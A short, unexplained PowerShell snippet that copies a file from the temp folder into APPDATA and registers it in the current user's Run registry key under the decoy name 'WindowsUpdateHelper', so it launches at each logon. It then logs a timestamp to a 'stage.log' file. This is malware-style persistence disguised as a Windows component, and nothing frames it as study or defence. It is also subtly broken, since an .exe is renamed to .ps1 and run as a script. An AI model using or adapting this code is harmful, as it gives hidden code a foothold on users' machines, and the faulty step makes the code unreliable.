
Copy-Item -Path "$env:TEMP\updater.exe" -Destination "$env:APPDATA\updater.ps1" -Force
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name "WindowsUpdateHelper" -Value ('powershell.exe -NoP -File "' + "$env:APPDATA\updater.ps1" + '"') -Force
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
